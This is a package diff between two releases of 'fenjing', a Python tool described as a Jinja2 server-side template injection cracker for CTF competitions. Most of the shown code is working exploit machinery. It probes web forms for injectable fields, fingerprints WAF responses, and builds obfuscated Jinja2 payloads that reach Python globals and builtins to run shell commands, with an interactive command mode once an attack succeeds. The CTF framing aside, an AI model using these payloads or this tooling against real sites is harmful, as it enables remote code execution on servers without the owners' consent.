# Comparing `tmp/fenjing-0.2.0.tar.gz` & `tmp/fenjing-0.2.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "fenjing-0.2.0.tar", last modified: Tue Apr 18 04:25:34 2023, max compression
+gzip compressed data, was "fenjing-0.2.1.tar", last modified: Wed Apr 26 05:03:53 2023, max compression
```

## Comparing `fenjing-0.2.0.tar` & `fenjing-0.2.1.tar`

### file list

```diff
@@ -1,25 +1,27 @@
-drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-04-18 04:25:34.979000 fenjing-0.2.0/
--rw-r--r--   0 user      (1000) user      (1000)    16725 2023-03-31 12:04:28.000000 fenjing-0.2.0/LICENSE
--rw-r--r--   0 user      (1000) user      (1000)     3991 2023-04-18 04:25:34.979000 fenjing-0.2.0/PKG-INFO
--rwxr-x---   0 user      (1000) user      (1000)     3553 2023-04-02 06:31:23.000000 fenjing-0.2.0/README.md
-drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-04-18 04:25:34.978000 fenjing-0.2.0/fenjing/
--rwxr-xr-x   0 user      (1000) user      (1000)      165 2023-04-18 04:22:52.000000 fenjing-0.2.0/fenjing/__init__.py
--rw-r--r--   0 user      (1000) user      (1000)       60 2023-03-31 08:38:41.000000 fenjing-0.2.0/fenjing/__main__.py
--rw-r--r--   0 user      (1000) user      (1000)     3252 2023-04-18 04:22:52.000000 fenjing-0.2.0/fenjing/cli.py
--rwxr-x---   0 user      (1000) user      (1000)      637 2023-04-02 06:25:33.000000 fenjing-0.2.0/fenjing/example.py
--rwxr-x---   0 user      (1000) user      (1000)       36 2023-03-31 08:02:21.000000 fenjing-0.2.0/fenjing/exceptions.py
--rw-r--r--   0 user      (1000) user      (1000)     2030 2023-04-18 04:22:52.000000 fenjing-0.2.0/fenjing/form.py
--rw-r--r--   0 user      (1000) user      (1000)     4180 2023-04-18 04:22:52.000000 fenjing-0.2.0/fenjing/form_cracker.py
--rwxr-x---   0 user      (1000) user      (1000)     2759 2023-03-26 05:40:10.000000 fenjing-0.2.0/fenjing/int_vars.py
--rwxr-xr-x   0 user      (1000) user      (1000)    38819 2023-04-18 04:22:52.000000 fenjing-0.2.0/fenjing/pattern.py
--rw-r--r--   0 user      (1000) user      (1000)     1543 2023-04-18 04:22:52.000000 fenjing-0.2.0/fenjing/requester.py
--rw-r--r--   0 user      (1000) user      (1000)      895 2023-04-18 04:22:52.000000 fenjing-0.2.0/fenjing/scan_url.py
--rwxr-x---   0 user      (1000) user      (1000)     1719 2023-04-02 05:49:41.000000 fenjing-0.2.0/fenjing/shell_cmd.py
-drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-04-18 04:25:34.978000 fenjing-0.2.0/fenjing.egg-info/
--rw-r--r--   0 user      (1000) user      (1000)     3991 2023-04-18 04:25:34.000000 fenjing-0.2.0/fenjing.egg-info/PKG-INFO
--rw-r--r--   0 user      (1000) user      (1000)      417 2023-04-18 04:25:34.000000 fenjing-0.2.0/fenjing.egg-info/SOURCES.txt
--rw-r--r--   0 user      (1000) user      (1000)        1 2023-04-18 04:25:34.000000 fenjing-0.2.0/fenjing.egg-info/dependency_links.txt
--rw-r--r--   0 user      (1000) user      (1000)       30 2023-04-18 04:25:34.000000 fenjing-0.2.0/fenjing.egg-info/requires.txt
--rw-r--r--   0 user      (1000) user      (1000)        8 2023-04-18 04:25:34.000000 fenjing-0.2.0/fenjing.egg-info/top_level.txt
--rw-r--r--   0 user      (1000) user      (1000)       38 2023-04-18 04:25:34.979000 fenjing-0.2.0/setup.cfg
--rw-r--r--   0 user      (1000) user      (1000)      860 2023-03-31 12:05:47.000000 fenjing-0.2.0/setup.py
+drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-04-26 05:03:53.857000 fenjing-0.2.1/
+-rw-r--r--   0 user      (1000) user      (1000)    16725 2023-03-31 12:04:28.000000 fenjing-0.2.1/LICENSE
+-rw-r--r--   0 user      (1000) user      (1000)     4188 2023-04-26 05:03:53.857000 fenjing-0.2.1/PKG-INFO
+-rwxr-x---   0 user      (1000) user      (1000)     3750 2023-04-26 05:02:41.000000 fenjing-0.2.1/README.md
+drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-04-26 05:03:53.854000 fenjing-0.2.1/fenjing/
+-rwxr-xr-x   0 user      (1000) user      (1000)      155 2023-04-26 05:00:35.000000 fenjing-0.2.1/fenjing/__init__.py
+-rw-r--r--   0 user      (1000) user      (1000)       60 2023-03-31 08:38:41.000000 fenjing-0.2.1/fenjing/__main__.py
+-rw-r--r--   0 user      (1000) user      (1000)     3354 2023-04-26 05:00:35.000000 fenjing-0.2.1/fenjing/cli.py
+-rwxr-x---   0 user      (1000) user      (1000)      637 2023-04-02 06:25:33.000000 fenjing-0.2.1/fenjing/example.py
+-rwxr-x---   0 user      (1000) user      (1000)       36 2023-03-31 08:02:21.000000 fenjing-0.2.1/fenjing/exceptions.py
+-rw-r--r--   0 user      (1000) user      (1000)     2030 2023-04-18 04:22:52.000000 fenjing-0.2.1/fenjing/form.py
+-rw-r--r--   0 user      (1000) user      (1000)     4330 2023-04-26 05:00:35.000000 fenjing-0.2.1/fenjing/form_cracker.py
+-rwxr-xr-x   0 user      (1000) user      (1000)     2832 2023-04-26 05:00:35.000000 fenjing-0.2.1/fenjing/int_vars.py
+-rwxr-xr-x   0 user      (1000) user      (1000)    39085 2023-04-26 05:00:35.000000 fenjing-0.2.1/fenjing/pattern.py
+-rw-r--r--   0 user      (1000) user      (1000)    23145 2023-04-26 05:00:35.000000 fenjing-0.2.1/fenjing/payload_gen.py
+-rw-r--r--   0 user      (1000) user      (1000)     1543 2023-04-18 04:22:52.000000 fenjing-0.2.1/fenjing/requester.py
+-rw-r--r--   0 user      (1000) user      (1000)      895 2023-04-18 04:22:52.000000 fenjing-0.2.1/fenjing/scan_url.py
+-rwxr-x---   0 user      (1000) user      (1000)     1719 2023-04-02 05:49:41.000000 fenjing-0.2.1/fenjing/shell_cmd.py
+-rwxr-xr-x   0 user      (1000) user      (1000)     2270 2023-04-26 05:00:35.000000 fenjing-0.2.1/fenjing/shell_payload.py
+drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-04-26 05:03:53.857000 fenjing-0.2.1/fenjing.egg-info/
+-rw-r--r--   0 user      (1000) user      (1000)     4188 2023-04-26 05:03:53.000000 fenjing-0.2.1/fenjing.egg-info/PKG-INFO
+-rw-r--r--   0 user      (1000) user      (1000)      465 2023-04-26 05:03:53.000000 fenjing-0.2.1/fenjing.egg-info/SOURCES.txt
+-rw-r--r--   0 user      (1000) user      (1000)        1 2023-04-26 05:03:53.000000 fenjing-0.2.1/fenjing.egg-info/dependency_links.txt
+-rw-r--r--   0 user      (1000) user      (1000)       30 2023-04-26 05:03:53.000000 fenjing-0.2.1/fenjing.egg-info/requires.txt
+-rw-r--r--   0 user      (1000) user      (1000)        8 2023-04-26 05:03:53.000000 fenjing-0.2.1/fenjing.egg-info/top_level.txt
+-rw-r--r--   0 user      (1000) user      (1000)       38 2023-04-26 05:03:53.858000 fenjing-0.2.1/setup.cfg
+-rw-r--r--   0 user      (1000) user      (1000)      860 2023-03-31 12:05:47.000000 fenjing-0.2.1/setup.py
```

### Comparing `fenjing-0.2.0/LICENSE` & `fenjing-0.2.1/LICENSE`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.0/PKG-INFO` & `fenjing-0.2.1/PKG-INFO`

 * *Files 8% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.2.0
+Version: 0.2.1
 Summary: A Jinja2 SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.9
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
@@ -126,27 +126,29 @@
 - scan: 扫描整个网站
 - crack: 对某个特定的表单进行攻击
 
 ```
 Usage: python -m fenjing scan [OPTIONS]
 
 Options:
-  --url TEXT       需要扫描的URL
-  --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
-  --help           Show this message and exit.
-
-Usage: python -m fenjing crack [OPTIONS]
+  -u, --url TEXT       需要扫描的URL
+  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
+  --interval FLOAT     每次请求的间隔
+  --user-agent TEXT    请求时使用的User Agent
+  --help               Show this message and exit.
 
 Options:
-  --url TEXT       form所在的URL
-  --action TEXT    form的action，默认为当前路径
-  --method TEXT    form的提交方式，默认为POST
-  --inputs TEXT    form的参数，以逗号分隔
-  --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
-  --help           Show this message and exit.
+  -u, --url TEXT       form所在的URL
+  -a, --action TEXT    form的action，默认为当前路径
+  -m, --method TEXT    form的提交方式，默认为POST
+  -i, --inputs TEXT    form的参数，以逗号分隔
+  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
+  --interval FLOAT     每次请求的间隔
+  --user-agent TEXT    请求时使用的User Agent
+  --help               Show this message and exit.
 ```
 
 ### 作为python库使用
 
 参考[example.py](fenjing/example.py)
 
 ```python
```

### Comparing `fenjing-0.2.0/README.md` & `fenjing-0.2.1/README.md`

 * *Files 6% similar despite different names*

```diff
@@ -113,27 +113,29 @@
 - scan: 扫描整个网站
 - crack: 对某个特定的表单进行攻击
 
 ```
 Usage: python -m fenjing scan [OPTIONS]
 
 Options:
-  --url TEXT       需要扫描的URL
-  --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
-  --help           Show this message and exit.
-
-Usage: python -m fenjing crack [OPTIONS]
+  -u, --url TEXT       需要扫描的URL
+  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
+  --interval FLOAT     每次请求的间隔
+  --user-agent TEXT    请求时使用的User Agent
+  --help               Show this message and exit.
 
 Options:
-  --url TEXT       form所在的URL
-  --action TEXT    form的action，默认为当前路径
-  --method TEXT    form的提交方式，默认为POST
-  --inputs TEXT    form的参数，以逗号分隔
-  --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
-  --help           Show this message and exit.
+  -u, --url TEXT       form所在的URL
+  -a, --action TEXT    form的action，默认为当前路径
+  -m, --method TEXT    form的提交方式，默认为POST
+  -i, --inputs TEXT    form的参数，以逗号分隔
+  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
+  --interval FLOAT     每次请求的间隔
+  --user-agent TEXT    请求时使用的User Agent
+  --help               Show this message and exit.
 ```
 
 ### 作为python库使用
 
 参考[example.py](fenjing/example.py)
 
 ```python
```

### Comparing `fenjing-0.2.0/fenjing/cli.py` & `fenjing-0.2.1/fenjing/cli.py`

 * *Files 3% similar despite different names*

```diff
@@ -54,16 +54,18 @@
     result = cracker.crack()
     if result is None:
         logger.warning("Test form failed...")
         return
     payload_gen, field = result
 
     def cmd_exec_func(cmd):
-        return cracker.submit(
-            {field: payload_gen(cmd)}).text
+        r = cracker.submit(
+            {field: payload_gen(cmd)})
+        assert r is not None
+        return r.text
     if exec_cmd == "":
         interact(cmd_exec_func)
     else:
         print(cmd_exec_func(exec_cmd))
     logger.warning("Bye!")
 
 
@@ -79,16 +81,18 @@
             cracker = FormCracker(url=url, form=form, requester=requester)
             result = cracker.crack()
             if result is None:
                 continue
             payload_gen, field = result
 
             def cmd_exec_func(cmd):
-                return cracker.submit(
-                    {field: payload_gen(cmd)}).text
+                r = cracker.submit(
+                    {field: payload_gen(cmd)})
+                assert r is not None
+                return r.text
             if exec_cmd == "":
                 interact(cmd_exec_func)
             else:
                 print(cmd_exec_func(exec_cmd))
             return
     logger.warning("Scan failed...")
```

### Comparing `fenjing-0.2.0/fenjing/example.py` & `fenjing-0.2.1/fenjing/example.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.0/fenjing/form.py` & `fenjing-0.2.1/fenjing/form.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.0/fenjing/form_cracker.py` & `fenjing-0.2.1/fenjing/form_cracker.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,16 +1,15 @@
-import random
 from urllib.parse import urlparse
 from collections import Counter, namedtuple
 from functools import lru_cache
 import logging
 
 from . import form
 from .requester import Requester
-from .shell_cmd import exec_cmd_payload
+from .shell_payload import exec_cmd_payload
 
 
 logger = logging.getLogger("form_cracker")
 Result = namedtuple("Result", "payload_generate_func input_field")
 
 
 class FormCracker:
@@ -45,55 +44,59 @@
     def vulunable_inputs(self):
         fill_dict = form.random_fill(self.form)
         r = self.req.request(
             **form.fill_form(
                 self.url,
                 self.form,
                 form_inputs=fill_dict))
+        assert r is not None
         return [
             k for k, v in fill_dict.items()
             if v in r.text
         ]
 
     def submit(self, inputs: dict):
         logger.info(f"submit {inputs}")
-        if any(len(v) > 2048 for v in inputs.values()) and self.form["method"] == "GET":
+        all_length = sum(len(v) for v in inputs.values())
+        if all_length > 2048 and self.form["method"] == "GET":
             logger.warning(
-                "some inputs are extremely long that the request might fail")
+                f"inputs are extremely long (len={all_length}) that the request might fail")
         return self.req.request(
             **form.fill_form(self.url, self.form, inputs))
 
     def waf_page_hash(self, input_field: str):
         resps = {
             keyword: self.submit({input_field: keyword * 3})
             for keyword in self.dangerous_keywords
         }
         hashes = [
             hash(r.text) for r in resps.values()
-            if r.status_code != 500
+            if r is not None and r.status_code != 500
         ]
         return [pair[0] for pair in Counter(hashes).most_common(2)]
 
     def crack_inputs(self, input_field):
         logger.info(f"Testing {input_field}")
 
         waf_hashes = self.waf_page_hash(input_field)
 
         @lru_cache(100)
         def waf_func(value):
             r = self.submit({input_field: value})
+            assert r is not None
             return hash(r.text) not in waf_hashes
 
         payload, will_echo = exec_cmd_payload(waf_func, self.test_cmd)
         if payload is None:
             return None
         if will_echo:
             logger.warning(
                 f"Input {input_field} looks great, testing generated payload.")
             r = self.submit({input_field: payload})
+            assert r is not None
             if self.test_result in r.text:
                 logger.warning(f"Success! return a payload generator.")
             else:
                 logger.warning(
                     f"Test Payload Failed! return a payload generator anyway.")
             return Result(
                 payload_generate_func=(
```

### Comparing `fenjing-0.2.0/fenjing/int_vars.py` & `fenjing-0.2.1/fenjing/int_vars.py`

 * *Files 7% similar despite different names*

```diff
@@ -60,33 +60,35 @@
             "ob",
             "lb",
             "llb",
             "lllb",
             "llllb",
             "bb",
             "sbb",
-            "sbbb",
+            "ssbb",
             "zzeb"
         ]
     ),
     int_var("{%set zols=lipsum|escape|urlencode|list|escape|urlencode|count%}", 2015, "zols"),
     int_var("{%set ltr={}|escape|urlencode|list|escape|urlencode|count%}", 178, "ltr"),
     int_var("{%set lea=namespace|escape|urlencode|escape|urlencode|urlencode|urlencode|count%}", 134, "lea"),
     int_var("{%set lel=cycler|escape|urlencode|escape|urlencode|escape|urlencode|escape|urlencode|count%}", 131, "lel"),
     int_var("{%set qo=namespace|escape|urlencode|escape|urlencode|count%}", 90, "qo"),
     int_var("{%set bs=cycler|escape|urlencode|count%}", 65, "bs"),
     int_var("{%set ab=namespace|escape|count%}", 46, "ab"),
     int_var("{%set zb={}|escape|list|escape|count%}", 26, "zb"),
     int_var("{%set t=joiner|urlencode|wordcount%}", 7, "t"),
     int_var("{%set b={}|escape|urlencode|count%}", 6, "b"),
+    int_var("{%set e=(dict(a=x,b=x,c=x)|count)%}", 3, "e"),
     int_var("{%set l={}|escape|first|count%}", 1, "l"),
 ]
 
 
 def get_useable_int_vars(waf_func):
     ints, var_names, payload = [], [], ""
     for int_vars in int_vars_list:
-        if waf_func(int_vars.payload):
-            ints += int_vars.ints
-            var_names += int_vars.var_names
-            payload += int_vars.payload
+        if not waf_func(int_vars.payload):
+            continue
+        ints += int_vars.ints
+        var_names += int_vars.var_names
+        payload += int_vars.payload
     return ints, var_names, payload
```

### Comparing `fenjing-0.2.0/fenjing/pattern.py` & `fenjing-0.2.1/fenjing/pattern.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,31 +1,15 @@
 from .exceptions import *
 
 import abc
 import logging
-import sys
-import random
 from functools import lru_cache
 import re
 
-logger = logging.getLogger("[SSTI Pattern]")
-
-'''
-pattern可以根据输入参数生成一个字符串
-pattern可以依赖其他pattern类型，pattern之间的依赖关系组成一棵树
-在确定了输入参数之后，pattern可以生成测试样例以供测试，测试样例是一个字符串
-pattern可以根据依赖关系生成一个列表，内容为所依赖pattern的类型，以及输入的参数
-'''
-
-'''
-
-> Bypassing the WAF without knowing WAF
->   --- Sun Tsu The art of WAF
-
-'''
+logger = logging.getLogger("pattern")
 
 vars_dict = {
     "zols": "{%set zols=lipsum|escape|urlencode|list|escape|urlencode|count%}",
     "ltr": "{%set ltr={}|escape|urlencode|list|escape|urlencode|count%}",
     "lea": "{%set lea=namespace|escape|urlencode|escape|urlencode|urlencode|urlencode|count%}",
     "lel": "{%set lel=cycler|escape|urlencode|escape|urlencode|escape|urlencode|escape|urlencode|count%}",
     "qo": "{%set qo=namespace|escape|urlencode|escape|urlencode|count%}",
@@ -56,52 +40,56 @@
 
 
 def get_int_from_sum(i: int):
     """
     利用number_dict得出可以表达数字i的表达式
     """
     d = [(k, v) for k, v in number_dict.items() if 0 < k <= i]
-    d = dict(sorted(d, key = lambda x: x[0], reverse=True))
+    d = dict(sorted(d, key=lambda x: x[0], reverse=True))
     ans = []
     for k, v in d.items():
         while k <= i:
             i -= k
             ans.append(v)
-    if i :
+    if i:
         return None
     return ans
 
+
 use_record = {}
 
+
 class BasePattern(metaclass=abc.ABCMeta):
 
     def __init__(self):
         self._direct_requirements = []
         self._chosen_pattern = {}
         self._tested = False
 
     def require(self, pattern_class, *args):
         self._direct_requirements.append((pattern_class, *args))
 
     def test_requirements(self, test_func):
         chosen_pattern = {}
         for mother_pattern_class, *args in self._direct_requirements:
             subclasses = mother_pattern_class.__subclasses__()
-            subclasses = sorted(subclasses, key = lambda x: use_record.get(x, 0), reverse=True)
+            subclasses = sorted(
+                subclasses, key=lambda x: use_record.get(x, 0), reverse=True)
             for pattern_class in subclasses:
 
                 p = pattern_class(*args)
 
                 if not p.test_requirements(test_func):
                     continue
                 if not test_func(p.payload):
                     continue
 
                 chosen_pattern[(mother_pattern_class, *args)] = p
-                use_record[pattern_class] = use_record.get(pattern_class, 0) + 1
+                use_record[pattern_class] = use_record.get(
+                    pattern_class, 0) + 1
                 logger.debug(
                     f"{self.__class__.__name__} Test {mother_pattern_class.__name__} {args} success"
                 )
                 break
             else:
                 logger.debug(
                     f"{self.__class__.__name__} Test {mother_pattern_class.__name__} {args} failed, rolling back")
@@ -200,22 +188,24 @@
     def __init__(self):
         super().__init__()
         self.require(PlainPattern, "({}|urlencode|count)")
 
     def _generate(self):
         return "({}|urlencode|count)"
 
+
 class ZeroPattern4(ZeroPattern):
     def __init__(self):
         super().__init__()
         self.require(PlainPattern, "({}|int)")
 
     def _generate(self):
         return "({}|int)"
 
+
 class PositiveIntPattern(BasePattern):
     pass
 
 
 should_set_abcd = False
 
 
@@ -434,15 +424,15 @@
         self.require(IntPattern, num)
 
     def _generate(self):
         return "+" + self.use(IntPattern, self.num)
 
 
 class AddIntPattern2(AddIntPattern):
-    def __init__(self):
+    def __init__(self, num):
         super().__init__()
         self.num = num
         self.pattern = ".__add__(%s)"
         self.require(PlainPattern, self.pattern.replace("%s", ""))
         self.require(IntPattern, num)
 
     def _generate(self):
@@ -461,15 +451,15 @@
         self.require(IntPattern, num)
 
     def _generate(self):
         return "-" + self.use(IntPattern, self.num)
 
 
 class SubIntPattern2(SubIntPattern):
-    def __init__(self):
+    def __init__(self, num):
         super().__init__()
         self.num = num
         self.pattern = ".__sub__(%s)"
         self.require(PlainPattern, self.pattern.replace("%s", ""))
         self.require(IntPattern, num)
 
     def _generate(self):
@@ -502,42 +492,49 @@
     def __init__(self):
         super().__init__()
         self.require(PlainPattern, "({}|escape|urlencode|first)")
 
     def _generate(self):
         return "({}|escape|urlencode|first)"
 
+
 class PercentSignPattern4(PercentSignPattern):
     def __init__(self):
         super().__init__()
         self.pattern = "(lipsum[(lipsum|escape|batch(22)|list|first|last)*2+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2][(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))"
-        self.require(PlainPattern, self.pattern.replace("2", "").replace("37", ""))
+        self.require(PlainPattern, self.pattern.replace(
+            "2", "").replace("37", ""))
         self.require(IntPattern, 22)
         self.require(IntPattern, 2)
         self.require(IntPattern, 37)
+
     def _generate(self):
         return self.pattern\
             .replace("22", self.use(IntPattern, 22))\
             .replace("2", self.use(IntPattern, 2))\
             .replace("37", self.use(IntPattern, 37))
 
+
 class PercentSignPattern5(PercentSignPattern):
     def __init__(self):
         super().__init__()
         self.pattern = "(lipsum|attr((lipsum|escape|batch(22)|list|first|last)*2+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2)|attr((lipsum|escape|batch(22)|list|first|last)*2+dict(getitem=x)|join+(lipsum|escape|batch(22)|list|first|last)*2)((lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)|join+(lipsum|escape|batch(22)|list|first|last)*2)|attr((lipsum|escape|batch(22)|list|first|last)*2+dict(getitem=x)|join+(lipsum|escape|batch(22)|list|first|last)*2)(dict(chr=x)|join)(37))"
-        self.require(PlainPattern, self.pattern.replace("2", "").replace("37", ""))
+        self.require(PlainPattern, self.pattern.replace(
+            "2", "").replace("37", ""))
         self.require(IntPattern, 22)
         self.require(IntPattern, 2)
         self.require(IntPattern, 37)
+
     def _generate(self):
         return self.pattern\
             .replace("22", self.use(IntPattern, 22))\
             .replace("2", self.use(IntPattern, 2))\
             .replace("37", self.use(IntPattern, 37))
 
+
 class LowerCPattern(BasePattern):
     pass
 
 
 class LowerCPattern1(LowerCPattern):
     def __init__(self):
         super().__init__()
@@ -552,15 +549,16 @@
         super().__init__()
         self.require(PlainPattern, "dict(c={})|join".format(""))
         self.require(IntPattern, 1)
 
     def _generate(self):
         return "dict(c={})|join".format(
             self.use(IntPattern, 1).strip("(").strip(")")
-            )
+        )
+
 
 class LowerCPattern3(LowerCPattern):
     def __init__(self):
         super().__init__()
         self.require(PlainPattern, "lipsum|pprint|first|urlencode|last|lower")
 
     def _generate(self):
@@ -590,14 +588,15 @@
     def _generate(self):
         return "(" + (
             self.use(PercentSignPattern) +
             self.use(StrConcatPattern) +
             self.use(LowerCPattern)
         ) + ")"
 
+
 class PercentSignLowerCPattern2(PercentSignLowerCPattern):
     def __init__(self):
         super().__init__()
         self.pattern = "cycler|pprint|list|pprint|urlencode|batch(%s)|first|join|batch(%s)|list|last|reverse|join|lower"
         self.require(
             PlainPattern,
             self.pattern.replace("{}", "")
@@ -607,41 +606,48 @@
 
     def _generate(self):
         return self.pattern % (
             self.use(IntPattern, 10),
             self.use(IntPattern, 8)
         )
 
+
 class ManyPercentSignLowerCPattern(BasePattern):
     pass
 
+
 class ManyPercentSignLowerCPattern1(ManyPercentSignLowerCPattern):
     def __init__(self, num):
         super().__init__()
         self.num = num
         self.require(PercentSignLowerCPattern)
         self.require(PlainPattern, "*")
         self.require(IntPattern, num)
+
     def _generate(self):
         return "({}*{})".format(
             self.use(PercentSignLowerCPattern),
             self.use(IntPattern, self.num)
         )
 
+
 class ManyPercentSignLowerCPattern2(ManyPercentSignLowerCPattern):
     def __init__(self, num):
         super().__init__()
         self.num = num
         self.require(PercentSignLowerCPattern)
         self.require(StrConcatPattern)
+
     def _generate(self):
         return "({})".format(
-            self.use(StrConcatPattern).join(self.use(PercentSignLowerCPattern) for _ in range(self.num))
+            self.use(StrConcatPattern).join(
+                self.use(PercentSignLowerCPattern) for _ in range(self.num))
         )
 
+
 class StrPattern(BasePattern):
     pass
 
 
 class StrPattern01(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
@@ -755,14 +761,15 @@
 
     def _generate(self):
         return self.s.format(
             self.use(PlainPattern, self.inner_s),
             self.use(IntPattern, 1)
         )
 
+
 class StrPattern09(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
 
         mid = len(inner_s) // 2
         s_a, s_b = inner_s[:mid], inner_s[mid:]
         if not re.match("^[a-zA-Z_][a-zA-Z0-9_]*$", s_a) or not re.match("^[a-zA-Z_][a-zA-Z0-9_]*$", s_b):
@@ -803,35 +810,59 @@
             .use(StrConcatPattern)\
             .join(self.l)\
             .replace("{TWENTYTWO}", self.use(IntPattern, 22))
 
 
 class StrPattern11(StrPattern):
     def __init__(self, inner_s):
-        from urllib.parse import quote
+        super().__init__()
+        if not re.match("^[a-zA-Z_][a-zA-Z0-9_]*$", inner_s):
+            self.require(WillErrorPattern)
+            return
+
+        l = [
+            "(()|select|string|batch({TWENTYFIVE})|first|last)" if not word else f"dict({word}=cycler)|join"
+            for word in inner_s.split("_")
+        ]
+
+        self.l = l
+
+        self.require(StrConcatPattern)
+        self.require(IntPattern, 25)
+
+    def _generate(self):
+        return self\
+            .use(StrConcatPattern)\
+            .join(self.l)\
+            .replace("{TWENTYFIVE}", self.use(IntPattern, 25))
+
+
+class StrPattern12(StrPattern):
+    def __init__(self, inner_s):
         super().__init__()
         self.inner_s = "".join("\\u00" + hex(ord(c))[2:] for c in inner_s)
         self.require(PlainPattern, self.inner_s)
         self.require(PlainPattern, '"')
 
     def _generate(self):
         return '"' + self.inner_s + '"'
 
-class StrPattern12(StrPattern):
+
+class StrPattern13(StrPattern):
     def __init__(self, inner_s):
-        from urllib.parse import quote
         super().__init__()
         self.inner_s = "".join("\\u00" + hex(ord(c))[2:] for c in inner_s)
         self.require(PlainPattern, self.inner_s)
         self.require(PlainPattern, "'")
 
     def _generate(self):
         return "'" + self.inner_s + "'"
 
-class StrPattern13(StrPattern):
+
+class StrPattern14(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
 
         assert len(inner_s)
 
         self.inner_s = inner_s
 
@@ -857,15 +888,16 @@
         ])
 
         return self.pattern.format(
             self.use(ManyPercentSignLowerCPattern, len(self.inner_s)),
             numbers
         )
 
-class StrPattern14(StrPattern):
+
+class StrPattern15(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
 
         assert len(inner_s)
 
         self.inner_s = inner_s
 
@@ -1016,15 +1048,16 @@
 
     def _generate(self):
 
         if isinstance(self.inside, str):
             inside = self.use(PlainPattern, self.inside)
         elif isinstance(self.inside, tuple):
             inside = self.use(self.inside[0], *self.inside[1:])
-
+        else:
+            raise Exception("Unknown Error")
         s = inside
         c = ""
         for PatternType, *args in self.tp:
             append = self.use(PatternType, *args)
             if not c or c == append[0]:
                 s += append
             else:
```

### Comparing `fenjing-0.2.0/fenjing/requester.py` & `fenjing-0.2.1/fenjing/requester.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.0/fenjing/scan_url.py` & `fenjing-0.2.1/fenjing/scan_url.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.0/fenjing/shell_cmd.py` & `fenjing-0.2.1/fenjing/shell_cmd.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.0/fenjing.egg-info/PKG-INFO` & `fenjing-0.2.1/fenjing.egg-info/PKG-INFO`

 * *Files 8% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.2.0
+Version: 0.2.1
 Summary: A Jinja2 SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.9
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
@@ -126,27 +126,29 @@
 - scan: 扫描整个网站
 - crack: 对某个特定的表单进行攻击
 
 ```
 Usage: python -m fenjing scan [OPTIONS]
 
 Options:
-  --url TEXT       需要扫描的URL
-  --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
-  --help           Show this message and exit.
-
-Usage: python -m fenjing crack [OPTIONS]
+  -u, --url TEXT       需要扫描的URL
+  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
+  --interval FLOAT     每次请求的间隔
+  --user-agent TEXT    请求时使用的User Agent
+  --help               Show this message and exit.
 
 Options:
-  --url TEXT       form所在的URL
-  --action TEXT    form的action，默认为当前路径
-  --method TEXT    form的提交方式，默认为POST
-  --inputs TEXT    form的参数，以逗号分隔
-  --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
-  --help           Show this message and exit.
+  -u, --url TEXT       form所在的URL
+  -a, --action TEXT    form的action，默认为当前路径
+  -m, --method TEXT    form的提交方式，默认为POST
+  -i, --inputs TEXT    form的参数，以逗号分隔
+  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
+  --interval FLOAT     每次请求的间隔
+  --user-agent TEXT    请求时使用的User Agent
+  --help               Show this message and exit.
 ```
 
 ### 作为python库使用
 
 参考[example.py](fenjing/example.py)
 
 ```python
```

### Comparing `fenjing-0.2.0/setup.py` & `fenjing-0.2.1/setup.py`

 * *Files identical despite different names*

